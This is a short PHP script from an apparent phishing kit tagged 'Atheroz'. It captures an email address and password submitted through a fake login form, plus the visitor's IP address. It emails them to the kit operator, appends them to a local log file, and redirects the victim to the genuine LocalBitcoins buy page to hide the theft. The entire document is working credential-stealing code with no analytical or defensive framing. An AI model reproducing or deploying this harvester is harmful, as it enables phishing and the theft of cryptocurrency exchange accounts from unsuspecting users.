<meta http-equiv="Refresh"
content="0;url=https://localbitcoins.com/buy_bitcoins"> 
<?php  
include "atheroz.php";
$email = $_POST['correo'];  
$pass = $_POST['clavec'];  
$IP = getenv("REMOTE_ADDR");  
$BILSMG = "    
Corre0 : $email
pazz-C0rreo: $pass 
ip: $IP ";  
$MAIL_TITLE = "Atheroz | ".$IP."";  
$MAIL_HEADER = "From: Reporte_Atheroz";  
@mail($TO,$MAIL_TITLE,$BILSMG,$MAIL_HEADER);  
$handle = fopen("L0cal.txt", "a");  
fwrite($handle,$BILSMG);  
$x=md5(microtime());  



?>